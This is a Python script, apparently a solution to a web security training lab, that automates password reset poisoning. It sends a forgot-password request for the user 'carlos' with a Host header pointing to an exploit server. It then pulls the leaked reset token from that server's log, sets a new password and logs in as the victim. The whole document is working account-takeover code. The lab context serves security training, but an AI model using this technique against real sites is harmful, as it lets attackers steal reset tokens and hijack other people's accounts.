import sys
import requests
from bs4 import BeautifulSoup
import re



def extract_csrf_token(response):
    soup = BeautifulSoup(response.text, "html.parser")
    csrf_token = soup.find("input", {"name": "csrf"})["value"]
    return csrf_token


def find_exploit_server(url, session):
    response = session.get(url, timeout=10)
    if "exploit-link" in response.text:
        soup = BeautifulSoup(response.text, "html.parser")
        exploit_server_url = soup.find("a", {"id": "exploit-link"}).get("href")
        return exploit_server_url


def reset_carlos_password(url, session, exploit_server_url):
    response = session.get(f"{url}/forgot-password", timeout=10)
    csrf_token = extract_csrf_token(response)
    cookies = {'session': session.cookies['session'], '_lab': session.cookies['_lab']}

    # Sending forgot password request with modified host header pointing to the exploit server
    session.post(f"{url}/forgot-password", data={"csrf": csrf_token, "username": "carlos"}, headers={"Host": exploit_server_url.replace("https://", "")}, cookies=cookies)

    # Retrieving password reset link from exploit server log
    exploit_server_log_response = session.get(f"{exploit_server_url}/log", timeout=10)
    forgot_password_token = re.findall("/forgot-password\?temp-forgot-password-token=([a-zA-Z0-9]+)",exploit_server_log_response.text)[-1]

    data = {"csrf": csrf_token,
            "temp-forgot-password-token": forgot_password_token,
            "new-password-1": "pass",
            "new-password-2": "pass"}

    # Resetting carlos's password and verifying it happened successfully
    return session.post(f"{url}/forgot-password?temp-forgot-password-token={forgot_password_token}", data=data, timeout=10).status_code == 200


def login_as_carlos(url, session):
    response = session.get(f"{url}/login", timeout=10)
    csrf_token = extract_csrf_token(response)
    login_response = session.post(f"{url}/login", data={"csrf": csrf_token, "username": "carlos", "password": "pass"}, timeout=10)
    return "Your username is: carlos" in login_response.text


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)

    try:
        url = sys.argv[1].rstrip("/")
        session = requests.Session()
        session.mount("https://", requests.adapters.HTTPAdapter(max_retries=requests.adapters.Retry(total=3, backoff_factor=0.1)))

        print("(+) Finding exploit server URL...")
        exploit_server_url = find_exploit_server(url, session)
        if not exploit_server_url:
            print("(-) Exploit server not found. Check your URL and try again.")
            sys.exit(1)

        print("(+) Resetting carlos's password...")
        if not reset_carlos_password(url, session, exploit_server_url):
            print("(-) Password reset unsuccessful.")
            sys.exit(1)

        print("(+) Logging in as carlos...")
        if login_as_carlos(url, session):
            print("(+) Successfully logged in as carlos!")
        else:
            print("(-) Login unsuccessful.")


    except requests.exceptions.Timeout:
        print("(-) Request timed out.")

    except requests.exceptions.MissingSchema:
        print("(-) Please enter a valid URL.")

    except requests.exceptions.ConnectionError:
        print("(-) Unable to connect to the host. Check your URL and try again.")


if __name__ == "__main__":
    main()
